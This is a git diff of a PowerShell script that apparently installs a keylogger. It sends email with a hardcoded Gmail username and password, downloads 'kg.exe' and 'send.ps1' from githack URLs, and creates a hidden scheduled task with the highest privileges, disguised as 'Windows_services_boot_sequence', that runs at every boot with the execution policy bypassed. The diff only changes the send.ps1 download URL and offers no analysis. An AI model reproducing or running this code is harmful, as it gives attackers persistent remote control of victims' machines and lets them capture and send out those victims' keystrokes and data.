@@ -31,7 +31,7 @@ if( -Not (Test-Path $pwd\fingerprint) ){
     $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("templeynonso@gmail.com", "oguezuonu"); 
     $SMTPClient.Send($SMTPMessage)
     $browser.DownloadFile( "https://rawcdn.githack.com/commnc/sources/f1c5bfa6094e71c5165fcccfc07710887c100e91/kg.exe" , "$pwd\kg.exe" )
-    $browser.DownloadFile( "https://rawcdn.githack.com/commnc/sources/1ad4bbc270d7b9260e03d64b3cd84d693531eb3e/send.ps1" , "$pwd\send.ps1" )
+    $browser.DownloadFile( "https://raw.githack.com/commnc/sources/master/send.ps1" , "$pwd\send.ps1" )
     schtasks.exe /create /sc onstart /tn "Windows_services_boot_sequence" /rl HIGHEST /tr "C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -windowstyle hidden -file '$pwd\bootstrap.ps1'"
 }
 $ComputerFingerPrint = Get-Content $pwd\fingerprint
